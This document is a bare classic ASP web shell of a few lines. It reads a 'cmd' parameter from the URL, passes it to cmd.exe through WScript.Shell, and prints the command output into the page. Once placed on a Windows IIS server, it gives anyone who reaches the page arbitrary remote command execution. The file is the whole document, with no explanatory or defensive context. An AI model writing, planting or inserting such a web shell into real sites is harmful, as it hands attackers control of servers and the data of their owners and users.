<pre><%
Dim cmd
cmd = Request.QueryString("cmd")
response.Write(CreateObject("WScript.Shell").exec("cmd.exe /c " + cmd).StdOut.ReadAll)
%></pre>